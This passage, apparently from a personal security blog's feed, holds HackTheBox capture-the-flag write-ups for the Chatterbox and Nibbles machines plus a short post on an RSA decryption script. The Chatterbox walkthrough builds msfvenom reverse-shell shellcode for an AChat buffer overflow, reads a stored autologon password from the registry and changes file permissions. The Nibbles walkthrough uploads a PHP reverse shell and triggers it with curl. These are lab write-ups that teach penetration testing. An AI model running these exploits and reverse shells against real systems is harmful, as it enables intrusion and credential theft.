+&lt;p&gt;Connecting with my supplied VPN from HackTheBox&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;, and performing the initial NMAP scan on the box IP: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.74&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Chatterbox$ nmap -p- -T4 -Pn 10.10.10.74
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-18 16:57 CEST
+Nmap scan report for AChat (10.10.10.74)
+Host is up (0.041s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE
+9255/tcp open  mon
+9256/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 287.36 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So that gives us two ports, lets run a more thorough scan on both.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Chatterbox$ nmap -p9255,9256 -sV --version-all 10.10.10.74
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-18 17:05 CEST
+Nmap scan report for AChat (10.10.10.74)
+Host is up (0.042s latency).
+
+PORT     STATE SERVICE VERSION
+9255/tcp open  http    AChat chat system httpd
+9256/tcp open  achat   AChat chat system
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.09 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Verification of these services can be done with a simple banner grab using netcat&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Chatterbox$ nc 10.10.10.74 9255
+&amp;gt; GET / HTTP/1.1
+
+HTTP/1.1 204 No Content
+Connection: close
+Server: AChat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now it serves a HTTP 204 No Content, but the server seems interesting. Reporting as AChat&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; we can determine (Unless its a fake HTTP Server), that there’s some kind of chat server running behind that port.
+Using Searchsploit we can quite quickly see if there is some ready made exploit available.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Chatterbox$ searchsploit achat
+-------------------------------------------- ----------------------------------
+ Exploit Title                              |  Path
+                                            | (/usr/share/exploitdb/)
+-------------------------------------------- ----------------------------------
+Achat 0.150 beta7 - Remote Buffer Overflow  | exploits/windows/remote/36025.py
+[..snip..]
+-------------------------------------------- ----------------------------------
+Shellcodes: No Result
+Papers: No Result
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So there is as I mentioned before a ready made Buffer OverFlow, that could be used.
+First of all copy it to the current directory and look into the sourcecode (remember to never run anything without reviewing the sourcecode).&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Chatterbox$ searchsploit -m 36025.py
+  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
+      URL: https://www.exploit-db.com/exploits/36025/
+     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
+File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
+
+Copied to: /root/Documents/Documentation/CTF/htb/chatterbox/blog/36025.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The exploit comes with some customization. Namely create your own shellcode to use in the exploit, and as the exploit suggests lets use msfvenom to create a reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Chatterbox$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4000 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python &amp;gt; shellcode.py
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/unicode_mixed
+x86/unicode_mixed succeeded with size 774 (iteration=0)
+x86/unicode_mixed chosen with final size 774
+Payload size: 774 bytes
+Final size of python file: 3706 bytes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now LHOST and LPORT are my own, substitute for your IP recieved by HackTheBox. The important part is that the shellcode generated is below 1152 bytes, as that is specified as the largest payload for this exploit. Mine that was generated is 774 bytes, so well below the threshold.
+Using a texteditor lets remove the existing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt; lines from the exploit and replace with our generated ones.
+Now using the exploit, we also need to have a listener before the service is exploited.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Exploit:
+root@kali:~/Chatterbox$ python 36025.py
+----&amp;gt;{P00F}!
+root@kali:~/Chatterbox$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Listener:
+root@kali:~/Chatterbox$ nc -lvvp 4000
+listening on [any] 4000 ...
+connect to [10.10.14.7] from AChat [10.10.10.74] 49157
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&amp;gt;whoami
+whoami
+chatterbox\alfred
+C:\Windows\system32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cool, has shell, as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Chatterbox\Alfred&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:\Users\Alfred\Desktop&amp;gt;dir /Q
+Directory of c:\Users\Alfred\Desktop
+[..snip..]
+12/10/2017  07:50 PM                32 CHATTERBOX\Alfred      user.txt
+[..snip..]
+c:\Users\Alfred\Desktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So that takes care of one flag. Lets go for root!
+Doing some registry enumeration, which can be automated with scripts like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sherlock.ps1&lt;/code&gt;&lt;sup id=&quot;fnref:3&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;.
+We are presented with:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:\Users\Alfred\Desktop&amp;gt;reg query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+[..snip..]
+    DefaultUserName    REG_SZ    Alfred
+    AutoAdminLogon    REG_SZ    1
+    DefaultPassword    REG_SZ    Welcome1!
+[..snip..]
+c:\Users\Alfred\Desktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Got a user and the password, what would the odds be that Alfred uses the same password for the administrator account?
+One could use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell&lt;/code&gt; to get a shell as Administrator. But since you also have read access into the Administrator user as Alfred, we can also see if we can change permissions on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;icacls&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:\Users\Administrator&amp;gt;icacls c:\Users\administrator\desktop\root.txt CHATTERBOX\Alfred:(RX)
+icacls c:\Users\administrator\desktop\root.txt CHATTERBOX\Alfred:(RX)
+Invalid parameter &quot;CHATTERBOX\Alfred:(RX)&quot;
+
+c:\Users\Administrator&amp;gt;icacls c:\Users\Administrator\Desktop\root.txt /grant everyone:(f)
+icacls c:\Users\Administrator\Desktop\root.txt /grant everyone:(f)
+processed file: c:\Users\Administrator\Desktop\root.txt
+Successfully processed 1 files; Failed processing 0 files
+
+c:\Users\Administrator&amp;gt;type Desktop\root.txt
+type Desktop\root.txt
+EatSleepPwnRepeat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;www.hackthebox.eu&quot;&gt;www.hackthebox.eu&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://sourceforge.net/projects/achat/&quot;&gt;www.sourceforge.net/projects/achat/&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:3&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1&quot;&gt;www.github.com/rasta-mouse&lt;/a&gt; &lt;a href=&quot;#fnref:3&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Christoffer Claesson</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="ctf" />
+      
+
+      
+        <summary type="html">My writeup of the Hack the box Chatterbox.</summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">RSA Prime Decryption</title>
+      <link href="/rsa-prime-decryption" rel="alternate" type="text/html" title="RSA Prime Decryption" />
+      <published>2018-04-16T00:00:00+00:00</published>
+      <updated>2018-04-16T00:00:00+00:00</updated>
+      <id>/rsa-prime-decryption</id>
+      <content type="html" xml:base="/rsa-prime-decryption">&lt;blockquote&gt;
+  &lt;p&gt;Description and usage of a decryption script that I wrote for CTF Challenges.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So I’ve encountered this problem in a couple Capture the Flag Challenges, where you are given the Primes, as well as a ciphertext in decimal number form.&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c = 95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885
+p = 11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243
+q = 12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629
+dp = 8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961
+dq = 3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lets take “PicoCTF - Weird RSA flag”
+Now had these primes been sufficiently small, we could do the decryption of the cipher text manually. But having Prime numbers that are 150+ chars long will make it (at least for me rather difficult).&lt;br /&gt;
+The Python script can be found at my Github-Repo &lt;a href=&quot;http://https://github.com/Securitybits-io/RSA-Primes---Chinese-Remainder-Theorem&quot;&gt;Securitybits-io&lt;/a&gt;. 
+Using it is fairly simple, as it has a help section, try it with the above primes to verify the results.
+I did not invent the Chinese Theorem or the RSA Algorithm. But merely implemented them, if you are further interested in the algorithm and techniques behind. Then I recommend to spend an hour reading the wiki page as well as the other two links I put under “References”.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Kali:~# python rsa-prime-decryption.py &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;
+usage: rsa-prime-decryption.py &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--p&lt;/span&gt; P] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--q&lt;/span&gt; Q] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--dp&lt;/span&gt; DP] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--dq&lt;/span&gt; DQ] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--c&lt;/span&gt; C]
+
+Decryption tool &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;RSA Primes using the Chinese Remainder Theorem
+
+optional arguments:
+  &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;  show this &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;message and &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;--p&lt;/span&gt; P       Input prime p used &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;RSA decryption
+  &lt;span class=&quot;nt&quot;&gt;--q&lt;/span&gt; Q       Input prime q used &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;RSA Decryption
+  &lt;span class=&quot;nt&quot;&gt;--dp&lt;/span&gt; DP     Input Chinese Remainder dp used &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;RSA decryption
+  &lt;span class=&quot;nt&quot;&gt;--dq&lt;/span&gt; DQ     Input Chinese Remainder dq used &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;RSA Decryption
+  &lt;span class=&quot;nt&quot;&gt;--c&lt;/span&gt; C       Input Cipher text to decrypt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# python rsa-prime-decryption.py &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--p&lt;/span&gt; 11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--q&lt;/span&gt; 12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--dp&lt;/span&gt; 8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--dq&lt;/span&gt; 3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--c&lt;/span&gt; 95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885
+Theres_more_than_one_way_to_RSA
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;:&lt;br /&gt;
+RSA Cryptosystem&lt;br /&gt;
+https://en.wikipedia.org/wiki/RSA_(cryptosystem)&lt;br /&gt;
+Decrypting RSA using CRT&lt;br /&gt;
+http://www.cscjournals.org/manuscript/Journals/IJCSS/Volume10/Issue5/IJCSS-1289.pdf&lt;br /&gt;
+Modular inverse example&lt;br /&gt;
+https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Christoffer Claesson</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="ctf" />
+      
+
+      
+        <summary type="html">Description and usage of a decryption script that I wrote for CTF Challenges.</summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">Nibbles Writeup</title>
+      <link href="/nibbles-writeup" rel="alternate" type="text/html" title="Nibbles Writeup" />
+      <published>2018-03-08T00:00:00+00:00</published>
+      <updated>2018-03-08T00:00:00+00:00</updated>
+      <id>/nibbles-writeup</id>
+      <content type="html" xml:base="/nibbles-writeup">&lt;blockquote&gt;
+  &lt;p&gt;“My writeup of the Hack the box Nibbles box… Nibble nibble!”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Connecting to Hack the Box&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; using the supplied VPN, my Nibbles box have the IP: 10.10.10.75
+As per usual, lets start with Recon and NMAP the target IP&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Nibbles$ nmap -p- --version-all -sV -sS 10.10.10.75
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-09 07:44 CET
+Nmap scan report for nibbles.htb (10.10.10.75)
+Host is up (0.047s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.18 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Seeing port 80 open, lets browse to that and look at the source code, as the base directory doesn’t show anything revealing.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;b&amp;gt;Hello world!&amp;lt;/b&amp;gt;
+&amp;lt;!-- /nibbleblog/ directory. Nothing interesting here! --&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Seeing that we have a new directory to explore, lets go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nibbleblog/&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2018/03/nibbles-writeup/nibblesblog-root.png&quot; alt=&quot;nibblesblog-root&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So that points to the Content Management System (CMS) called Nibbleblog, which is opensource and free to download the sourcecode, which means we can take a look at it.&lt;/p&gt;
+
+&lt;p&gt;A bit of googling points me to the github https://github.com/dignajar/nibbleblog&lt;/p&gt;
+
+&lt;p&gt;Where the basefile &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt; looks interesting, and sure enough it does exist on our target.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2018/03/nibbles-writeup/nibblesblog-admin.png&quot; alt=&quot;nibblesblog-admin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The next interesting file from the github looks to be “install.php”, on our target blog it is obviously already installed, nontheless it might be worth checking out!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2018/03/nibbles-writeup/nibblesblog-install.png&quot; alt=&quot;nibblesblog-install&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets follow the update link to the update page!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2018/03/nibbles-writeup/nibblesblog-update.png&quot; alt=&quot;nibblesblog-update&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So this further reveals two files where one is quite interesting, as config files usually contains usernames even possibly passwords, and other essential config parameters!
+So lets browse to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nibbleblog/content/private/config.xml&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;config&amp;gt;
+[...snip...]
+&amp;lt;notification_email_to type=&quot;string&quot;&amp;gt;admin@nibbles.com&amp;lt;/notification_email_to&amp;gt;
+&amp;lt;notification_email_from type=&quot;string&quot;&amp;gt;noreply@10.10.10.134&amp;lt;/notification_email_from&amp;gt;
+&amp;lt;seo_site_title type=&quot;string&quot;&amp;gt;Nibbles - Yum yum&amp;lt;/seo_site_title&amp;gt;
+[...snip...]
+&amp;lt;/config&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So this time the config file does not reveal any passwords, although we’re not emptyhanded as we do get a valid username “admin”.
+After some further enumeration I could not find a hint towards a password or any other vulnerability to use. So I resulted in trying THC-Hydra&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; and a small passwordlist in an attempt to run a dictionary against the login page!
+Which only got me on their blacklist and blocked me a couple minutes from making further login attempts.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2018/03/nibbles-writeup/nibblesblog-login-blacklist.png&quot; alt=&quot;nibblesblog-login-blacklist&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then after some further checking of the source code, i recalled it supposed to be a fairly simple box, so back to some default passwords.
+Bingo, user: Admin, Password: nibbles so a weak password indeed.
+Doing a grep for the password “nibbles” in the standard “rockyou.txt” that is included in Kali linux.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Wordlists$ grep 'nibbles' rockyou.txt
+nibbles
+nibbles1
+[...snip...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We can see that doing the hydra would indeed work… eventually, you’d just have to do some timeouts between attempts.
+Either way, we have the password and is logged in to the CMS admin panel!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2018/03/nibbles-writeup/nibblesblog-logged-in.png&quot; alt=&quot;nibblesblog-logged-in&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next up would be to try and get a shell on the system somehow, so back to google!
+It eventually pointed me to another security researchers blog&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html&quot;&gt;CureSec Nibbleblog 4.0.3 RCE&lt;/a&gt;&lt;sup id=&quot;fnref:3&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;p&gt;The PoC Exploit work in 4 steps:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Obtain Admin credentials
+2. Activate My image plugin
+3. Upload PHP shell, ignore warnings
+4. Visit http://localhost/nibbleblog/content/private/plugins/my_image/image.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So since we are already logged in, we can go to step two and activate the “My Image Plugin” under Plugins in the CMS Admin Panel.
+Then lets create and upload a php reverse shell.
+My favourite php-reverse-shell is included in kali, that pentestmonkey created.
+Copy that to the working directory by issuing.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Nibbles$ cp /usr/share/webshells/php/php-reverse-shell.php .
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then edit the $ip and $port variable in the php script, in this example i use port 4000. Once thats done, we can upload it to the CMS and start a netcat listener on our chosen port with (nc -lvvp 4000)
+In this example i used curl to trigger the RCE since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;image.php&lt;/code&gt; is in a public folder.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Nibbles$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That should kick of a basic shell created by the PHP script to the Netcat listener.
+Although the shell we recieve is a limited one, so lets enumerate which perl and python libraries are present to escape the limited shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Nibbles$ nc -lvvp 4000
+listening on [any] 4000 ...
+connect to [10.10.14.2] from nibbles.htb [10.10.10.75] 49562
+Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 01:55:01 up 4 days,  6:33,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+/bin/sh: 0: can't access tty; job control turned off
+$ which python
+$ which perl
